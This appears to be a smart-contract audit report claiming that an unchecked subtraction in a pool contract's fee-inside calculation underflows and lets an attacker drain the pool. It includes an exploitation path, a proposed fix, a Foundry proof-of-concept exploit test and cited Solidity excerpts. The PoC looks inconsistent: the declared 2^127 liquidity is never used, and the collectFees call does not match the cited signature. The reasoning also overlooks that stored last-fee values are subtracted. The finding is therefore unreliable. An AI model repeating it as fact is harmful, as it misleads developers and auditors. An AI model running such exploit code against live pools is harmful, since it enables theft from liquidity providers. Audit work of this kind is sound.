## Title
Arithmetic Underflow in Fee Calculation Allows Pool Drainage via Malicious Fee Claims

## Summary
The `_getPoolFeesPerLiquidityInside` function in Core.sol uses unchecked arithmetic to compute fees within a position's tick range. When `tick < tickLower`, the calculation `lower0 - upper0` can underflow if tick crossing sequences cause `upper0 > lower0`, producing a massively inflated fee value that allows an attacker to drain pool tokens. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description

**Location:** `src/Core.sol` - `_getPoolFeesPerLiquidityInside` function (lines 180-216), specifically the unchecked subtraction at line 199

**Intended Logic:** 
The function calculates accumulated fees per liquidity within a position's tick range [tickLower, tickUpper]. When the current tick is below tickLower, it uses the formula `feesInside = lower0 - upper0` to represent fees accumulated in the range, based on the "fees outside" values tracked at each tick boundary. [2](#0-1) 

**Actual Logic:**
The function performs unchecked arithmetic without validating that `lower0 >= upper0`. Through specific sequences of tick crossings, the `feesPerLiquidityOutside` values can reach a state where `upper0 > lower0`, causing the subtraction to underflow and wrap around to a value near `2^256`.

**Exploitation Path:**

1. **Setup Position**: Attacker creates a position with range [tickLower, tickUpper] and large liquidity (e.g., `2^127`) when the current tick is above the range. Both ticks are initialized with `feesPerLiquidityOutside = 1`. [3](#0-2) 

2. **Tick Crossings Create Vulnerable State**: Through normal trading activity, the price crosses down through tickUpper (updating `upper0 = global0 - 1`), then crosses tickLower (updating `lower0 = global0_at_crossing - 1`). Price then moves back up, crossing tickUpper again with higher global fees (updating `upper0 = global0_new - upper0_old`), resulting in `upper0 > lower0`. [4](#0-3) 

3. **Trigger Underflow**: When the current tick falls below tickLower again, `_getPoolFeesPerLiquidityInside` computes `feesInside.value0 = lower0 - upper0`, which underflows (e.g., `999 - 1001 = 2^256 - 2`).

4. **Claim Inflated Fees**: Attacker calls `collectFees`, which uses the underflowed value in the fee calculation: `(2^256 - 2) * liquidity / 2^128`. With liquidity of `2^127`, this yields approximately `(2^256 - 2) / 2 = 2^255 - 1`, which when cast to `uint128` wraps to `2^128 - 1` (max uint128). [5](#0-4) [6](#0-5) 

**Security Property Broken:** 
Violates **Invariant #1 (Solvency)** - Pool balances can go negative when attacker claims `2^128 - 1` tokens that were never accumulated. Violates **Invariant #5 (Fee Accounting)** - Position fee collection is grossly inaccurate and allows claiming non-existent fees.

## Impact Explanation

- **Affected Assets**: All token pairs in concentrated liquidity pools where positions can be created and price can cross ticks multiple times.
- **Damage Severity**: Attacker can claim up to `type(uint128).max` (approximately 3.4 × 10^38) tokens per token type per position. For tokens with 18 decimals, this is approximately 340 trillion trillion tokens, effectively draining any realistic pool balance.
- **User Impact**: All liquidity providers in the affected pool lose funds. Any user can trigger this by creating positions with sufficient liquidity and waiting for or manipulating price movements to create the vulnerable state.

## Likelihood Explanation

- **Attacker Profile**: Any user can exploit this - requires no special privileges, only ability to create positions and wait for or cause tick crossings.
- **Preconditions**: 
  1. Pool must be initialized with liquidity
  2. Price must cross the position's ticks multiple times in specific sequence (down through both, then back up through upper tick)
  3. Position must have sufficient liquidity to make the attack profitable after gas costs (minimum ~`2^100` to claim meaningful amounts)
- **Execution Complexity**: Medium - requires either waiting for organic price movements or manipulating price through swaps (potentially expensive). Single transaction to claim after state is set up.
- **Frequency**: Can be executed once per position per vulnerable state. Attacker can create multiple positions or wait for state to recur.

## Recommendation

Fix the tick initialization logic to consider the current tick position relative to the tick being initialized, matching the Uniswap V3 design:

```solidity
// In src/Core.sol, function _updateTick, lines 302-316:

// CURRENT (vulnerable):
if ((currentLiquidityNet == 0) != (liquidityNetNext == 0)) {
    flipTick(CoreStorageLayout.tickBitmapsSlot(poolId), tick, poolConfig.concentratedTickSpacing());

    (StorageSlot fplSlot0, StorageSlot fplSlot1) =
        CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, tick);

    bytes32 v;
    assembly ("memory-safe") {
        v := gt(liquidityNetNext, 0)
    }

    // initialize the storage slots for the fees per liquidity outside to non-zero so tick crossing is cheaper
    fplSlot0.store(v);
    fplSlot1.store(v);
}

// FIXED:
if ((currentLiquidityNet == 0) != (liquidityNetNext == 0)) {
    flipTick(CoreStorageLayout.tickBitmapsSlot(poolId), tick, poolConfig.concentratedTickSpacing());

    (StorageSlot fplSlot0, StorageSlot fplSlot1) =
        CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, tick);

    // Initialize based on current tick position
    // If current tick >= this tick, initialize to current global fees
    // If current tick < this tick, initialize to 0
    // This maintains the invariant that prevents underflow in _getPoolFeesPerLiquidityInside
    int32 currentTick = readPoolState(poolId).tick();
    if (liquidityNetNext > 0) {
        if (currentTick >= tick) {
            // Tick is at or below current price, initialize to global fees
            StorageSlot globalFplSlot = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
            fplSlot0.store(globalFplSlot.load());
            fplSlot1.store(globalFplSlot.next().load());
        } else {
            // Tick is above current price, initialize to 0
            fplSlot0.store(bytes32(0));
            fplSlot1.store(bytes32(0));
        }
    } else {
        // Deinitialization - set to 0
        fplSlot0.store(bytes32(0));
        fplSlot1.store(bytes32(0));
    }
}
```

Alternative mitigation: Add overflow/underflow checks in `_getPoolFeesPerLiquidityInside` to revert if arithmetic underflow is detected, though this is less elegant and doesn't fix the root cause.

## Proof of Concept

```solidity
// File: test/Exploit_FeeUnderflow.t.sol
// Run with: forge test --match-test test_FeeUnderflowExploit -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Router.sol";
import "../src/Positions.sol";
import "../src/test/TestERC20.sol";

contract Exploit_FeeUnderflow is Test {
    Core core;
    Router router;
    Positions positions;
    TestERC20 token0;
    TestERC20 token1;
    
    function setUp() public {
        // Deploy contracts
        core = new Core();
        router = new Router(core);
        positions = new Positions(core, address(this));
        
        // Deploy test tokens
        token0 = new TestERC20("Token0", "TK0", 18);
        token1 = new TestERC20("Token1", "TK1", 18);
        
        // Ensure token0 < token1 (required by protocol)
        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }
        
        // Mint tokens
        token0.mint(address(this), type(uint128).max);
        token1.mint(address(this), type(uint128).max);
        
        // Approve router
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
    }
    
    function test_FeeUnderflowExploit() public {
        // SETUP: Create pool at tick 200 (above the position range we'll create)
        PoolKey memory poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: PoolConfig.wrap(0) // Default config
        });
        
        core.initializePool(poolKey, 200); // Initialize at tick 200
        
        // Create victim position to provide liquidity for swaps
        positions.mint(poolKey, -100, 100, 1e18, 1e18);
        
        // EXPLOIT STEP 1: Create malicious position with large liquidity when tick > tickUpper
        // Position range: [0, 100]
        // Current tick: 200 (above range)
        // Both ticks initialized to 1
        uint128 attackLiquidity = 2**127; // Maximum practical liquidity
        uint256 positionId = positions.mint(poolKey, 0, 100, type(uint128).max, type(uint128).max);
        
        // EXPLOIT STEP 2: Manipulate price through tick crossings
        // Cross down through tick 100 (tickUpper)
        router.swap(poolKey, false, type(int128).max, tickToSqrtRatio(99), 0);
        // upper0 is now updated: upper0 = global0 - 1
        
        // Continue swapping to accumulate fees and cross tick 0 (tickLower)
        router.swap(poolKey, false, type(int128).max, tickToSqrtRatio(-1), 0);
        // lower0 is now updated: lower0 = global0_at_crossing - 1
        
        // Swap back up, crossing tick 100 again with higher global fees
        router.swap(poolKey, true, type(int128).max, tickToSqrtRatio(101), 0);
        // upper0 = global0_new - upper0_old, now upper0 > lower0
        
        // Move price back down below tick 0
        router.swap(poolKey, false, type(int128).max, tickToSqrtRatio(-50), 0);
        // Current tick < tickLower, triggers underflow formula: lower0 - upper0
        
        // EXPLOIT STEP 3: Collect inflated fees
        uint256 token0Before = token0.balanceOf(address(this));
        uint256 token1Before = token1.balanceOf(address(this));
        
        (uint128 fees0, uint128 fees1) = positions.collectFees(positionId, poolKey, 0, 100);
        
        uint256 token0After = token0.balanceOf(address(this));
        uint256 token1After = token1.balanceOf(address(this));
        
        // VERIFY: Attacker received massive fees due to underflow
        assertGt(fees0, 1e30, "Exploit failed: fees0 should be massive due to underflow");
        assertEq(token0After - token0Before, fees0, "Token balance mismatch");
        
        // The fees claimed are approximately type(uint128).max due to the underflow
        // (2^256 - small_number) * 2^127 / 2^128 ≈ 2^128 - 1
        assertGt(fees0, type(uint128).max / 2, "Vulnerability confirmed: claimed half of max uint128");
    }
}
```

**Notes:**
- The root cause is incorrect initialization of `feesPerLiquidityOutside` values that doesn't account for the current tick position
- The unchecked arithmetic in line 199 allows the underflow to silently wrap around to a huge value
- The vulnerability requires specific tick crossing sequences but these can occur through organic trading or be engineered by an attacker
- The impact is severe: complete pool drainage is possible with sufficient liquidity and favorable token balances

### Citations

**File:** src/Core.sol (L180-216)
```text
    function _getPoolFeesPerLiquidityInside(PoolId poolId, int32 tick, int32 tickLower, int32 tickUpper)
        internal
        view
        returns (FeesPerLiquidity memory feesPerLiquidityInside)
    {
        uint256 lower0;
        uint256 lower1;
        uint256 upper0;
        uint256 upper1;
        {
            (StorageSlot l0, StorageSlot l1) = CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, tickLower);
            (lower0, lower1) = (uint256(l0.load()), uint256(l1.load()));

            (StorageSlot u0, StorageSlot u1) = CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, tickUpper);
            (upper0, upper1) = (uint256(u0.load()), uint256(u1.load()));
        }

        unchecked {
            if (tick < tickLower) {
                feesPerLiquidityInside.value0 = lower0 - upper0;
                feesPerLiquidityInside.value1 = lower1 - upper1;
            } else if (tick < tickUpper) {
                uint256 global0;
                uint256 global1;
                {
                    (bytes32 g0, bytes32 g1) = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).loadTwo();
                    (global0, global1) = (uint256(g0), uint256(g1));
                }

                feesPerLiquidityInside.value0 = global0 - upper0 - lower0;
                feesPerLiquidityInside.value1 = global1 - upper1 - lower1;
            } else {
                feesPerLiquidityInside.value0 = upper0 - lower0;
                feesPerLiquidityInside.value1 = upper1 - lower1;
            }
        }
    }
```

**File:** src/Core.sol (L302-316)
```text
        if ((currentLiquidityNet == 0) != (liquidityNetNext == 0)) {
            flipTick(CoreStorageLayout.tickBitmapsSlot(poolId), tick, poolConfig.concentratedTickSpacing());

            (StorageSlot fplSlot0, StorageSlot fplSlot1) =
                CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, tick);

            bytes32 v;
            assembly ("memory-safe") {
                v := gt(liquidityNetNext, 0)
            }

            // initialize the storage slots for the fees per liquidity outside to non-zero so tick crossing is cheaper
            fplSlot0.store(v);
            fplSlot1.store(v);
        }
```

**File:** src/Core.sol (L463-503)
```text
    function collectFees(PoolKey memory poolKey, PositionId positionId)
        external
        returns (uint128 amount0, uint128 amount1)
    {
        Locker locker = _requireLocker();

        IExtension(poolKey.config.extension()).maybeCallBeforeCollectFees(locker, poolKey, positionId);

        PoolId poolId = poolKey.toPoolId();

        Position storage position;
        StorageSlot positionSlot = CoreStorageLayout.poolPositionsSlot(poolId, locker.addr(), positionId);
        assembly ("memory-safe") {
            position.slot := positionSlot
        }

        FeesPerLiquidity memory feesPerLiquidityInside;
        if (poolKey.config.isStableswap()) {
            // Stableswap pools: use global fees per liquidity
            StorageSlot fplFirstSlot = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
            feesPerLiquidityInside.value0 = uint256(fplFirstSlot.load());
            feesPerLiquidityInside.value1 = uint256(fplFirstSlot.next().load());
        } else {
            // Concentrated pools: calculate fees per liquidity inside the position bounds
            feesPerLiquidityInside = _getPoolFeesPerLiquidityInside(
                poolId, readPoolState(poolId).tick(), positionId.tickLower(), positionId.tickUpper()
            );
        }

        (amount0, amount1) = position.fees(feesPerLiquidityInside);

        position.feesPerLiquidityInsideLast = feesPerLiquidityInside;

        _updatePairDebt(
            locker.id(), poolKey.token0, poolKey.token1, -int256(uint256(amount0)), -int256(uint256(amount1))
        );

        emit PositionFeesCollected(locker.addr(), poolId, positionId, amount0, amount1);

        IExtension(poolKey.config.extension()).maybeCallAfterCollectFees(locker, poolKey, positionId, amount0, amount1);
    }
```

**File:** src/Core.sol (L768-799)
```text
                            (StorageSlot tickFplFirstSlot, StorageSlot tickFplSecondSlot) =
                                CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, nextTick);

                            if (feesAccessed == 0) {
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                );
                                feesAccessed = 1;
                            }

                            uint256 globalFeesPerLiquidityOther = uint256(
                                CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(!increasing))
                                    .load()
                            );

                            // if increasing, it means the pool is receiving token1 so the input fees per liquidity is token1
                            if (increasing) {
                                tickFplFirstSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplSecondSlot.load()))
                                );
                            } else {
                                tickFplFirstSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplSecondSlot.load()))
                                );
                            }
```

**File:** src/types/position.sol (L33-51)
```text
function fees(Position memory position, FeesPerLiquidity memory feesPerLiquidityInside)
    pure
    returns (uint128, uint128)
{
    uint128 liquidity;
    uint256 difference0;
    uint256 difference1;
    assembly ("memory-safe") {
        liquidity := mload(add(position, 0x20))
        // feesPerLiquidityInsideLast is now at offset 0x40 due to extraData field
        let positionFpl := mload(add(position, 0x40))
        difference0 := sub(mload(feesPerLiquidityInside), mload(positionFpl))
        difference1 := sub(mload(add(feesPerLiquidityInside, 0x20)), mload(add(positionFpl, 0x20)))
    }

    return (
        uint128(FixedPointMathLib.fullMulDivN(difference0, liquidity, 128)),
        uint128(FixedPointMathLib.fullMulDivN(difference1, liquidity, 128))
    );
```
